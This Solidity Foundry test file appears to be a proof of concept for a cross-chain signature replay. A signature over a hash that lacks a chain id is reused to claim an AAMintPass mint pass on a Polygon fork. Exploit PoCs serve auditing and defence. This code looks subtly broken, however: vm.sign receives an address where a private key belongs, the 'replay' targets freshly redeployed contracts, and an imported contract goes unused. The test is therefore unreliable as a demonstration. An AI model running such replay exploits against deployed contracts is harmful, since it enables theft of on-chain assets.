// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/AAMintPass.sol";
import "../src/Verification.sol";

contract ExploitTest is Test {
    AAMintPass public mintPass;
    Verification public verification;
    address public founder = address(0x1);
    address public delegated = address(0x2);
    address public attacker = address(0x3);
    uint256 public chainIdEthereum = 1;
    uint256 public chainIdPolygon = 137;

    function setUp() public {
        // Deploy the Verification contract
        verification = new Verification();

        // Deploy the AAMintPass contract
        mintPass = new AAMintPass(founder, delegated);

        // Fund the attacker with some ETH
        vm.deal(attacker, 1 ether);

        // Set the initial state
        vm.prank(founder);
        mintPass.addAdmin(delegated);
    }

    function test_exploit() public {
        // Step 1: Sign a message on Ethereum
        bytes32 messageHash = keccak256(abi.encodePacked(attacker, "claimMintPass"));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(delegated, messageHash);

        // Step 2: Replay the signature on Polygon
        vm.createSelectFork("https://polygon-rpc.com", chainIdPolygon);

        // Deploy the same contracts on Polygon
        AAMintPass mintPassPolygon = new AAMintPass(founder, delegated);

        // Step 3: Use the same signature to claim a mint pass on Polygon
        vm.prank(attacker);
        mintPassPolygon.claimMintPass(v, r, s);

        // Assert the vulnerability: Attacker should have a mint pass on Polygon
        assertEq(mintPassPolygon.balanceOf(attacker), 1);
    }
}